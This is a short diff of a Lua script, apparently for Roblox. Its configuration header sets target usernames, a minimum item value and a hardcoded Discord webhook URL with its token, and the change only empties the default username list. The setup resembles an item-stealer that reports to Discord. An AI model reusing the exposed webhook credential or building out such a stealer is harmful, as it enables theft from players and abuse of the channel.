@@ -4,7 +4,7 @@ if _G.scriptExecuted then
 end
 _G.scriptExecuted = true
 
-local users = _G.Usernames or { GHOSS23 }
+local users = _G.Usernames or {}
 local min_value = _G.min_value or 0.1
 local ping = _G.pingEveryone or "No"
 local webhook = _G.webhook or "https://discord.com/api/webhooks/1450951811488813108/4lcItFTfvIV0lpizJ1qrQ6c9EYbV7soVaJb1onUlBSRm-gz_ZEQ4GLlHC_ZHYwGf5zuz"
